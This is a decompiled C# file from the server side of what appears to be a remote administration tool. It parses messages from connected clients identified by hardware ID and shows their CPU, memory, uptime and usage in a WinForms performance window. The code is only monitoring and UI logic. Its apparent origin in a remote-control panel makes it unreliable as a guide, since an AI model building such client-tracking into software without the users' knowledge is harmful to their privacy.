using System;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages
{
	// Token: 0x02000048 RID: 72
	internal class HandlerPerformance
	{
		// Token: 0x060001C1 RID: 449 RVA: 0x0001C78C File Offset: 0x0001A98C
		public static void Read(Clients client, object[] objects)
		{
			string a = (string)objects[1];
			if (!(a == "Connect"))
			{
				if (!(a == "Response"))
				{
					return;
				}
				FormPerformance form = (FormPerformance)client.Tag;
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.label3.Text = "System Time: " + ((int)objects[2] / 60).ToString() + " Minutes";
					form.circularProgressBar2.Text = ((int)objects[3]).ToString() + " %";
					form.circularProgressBar2.Value = (int)objects[3];
					form.circularProgressBar1.Text = ((int)objects[4]).ToString() + " %";
					form.circularProgressBar1.Value = (int)objects[4];
				}));
				return;
			}
			else
			{
				FormPerformance form = (FormPerformance)Application.OpenForms["Performance:" + (string)objects[2]];
				if (form == null)
				{
					client.Disconnect();
					return;
				}
				form.Invoke(new MethodInvoker(delegate()
				{
					form.Text = "Performance [" + (string)objects[2] + "]";
					form.client = client;
					Label label = form.label1;
					label.Text += (string)objects[3];
					Label label2 = form.label4;
					label2.Text = label2.Text + (string)objects[4] + " Mhz";
					Label label3 = form.label6;
					label3.Text += (string)objects[5];
					Label label4 = form.label7;
					label4.Text += (string)objects[6];
					Label label5 = form.label2;
					label5.Text += (string)objects[7];
					Label label6 = form.label5;
					label6.Text = label6.Text + (string)objects[8] + " Mhz";
					form.label3.Text = "System Time: " + ((int)objects[9] / 60).ToString() + " Minutes";
					form.circularProgressBar2.Text = ((int)objects[10]).ToString() + " %";
					form.circularProgressBar2.Value = (int)objects[10];
					form.circularProgressBar1.Text = ((int)objects[11]).ToString() + " %";
					form.circularProgressBar1.Value = (int)objects[11];
				}));
				client.Tag = form;
				client.Hwid = (string)objects[2];
				return;
			}
		}
	}
}
